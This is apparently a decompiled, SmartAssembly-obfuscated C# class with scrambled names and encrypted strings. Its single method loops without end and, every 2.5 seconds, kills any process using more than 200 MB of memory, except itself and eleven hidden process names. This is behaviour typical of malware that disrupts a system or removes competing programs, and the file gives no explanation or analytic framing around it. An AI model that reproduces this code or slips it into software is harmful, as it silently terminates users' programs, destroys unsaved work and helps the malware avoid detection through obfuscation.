using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

public static class RmnijQkhIZRX
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ntDUiMqCnKMgdH()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107351531)) && !process.ProcessName.Contains(getString_0(107351522)) && !process.ProcessName.Contains(getString_0(107351481)) && !process.ProcessName.Contains(getString_0(107351472)) && !process.ProcessName.Contains(getString_0(107351491)) && !process.ProcessName.Contains(getString_0(107351446)) && !process.ProcessName.Contains(getString_0(107351465)) && !process.ProcessName.Contains(getString_0(107351420)) && !process.ProcessName.Contains(getString_0(107351439)) && !process.ProcessName.Contains(getString_0(107351426)) && !process.ProcessName.Contains(getString_0(107351405)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static RmnijQkhIZRX()
	{
		Strings.CreateGetStringDelegate(typeof(RmnijQkhIZRX));
	}
}
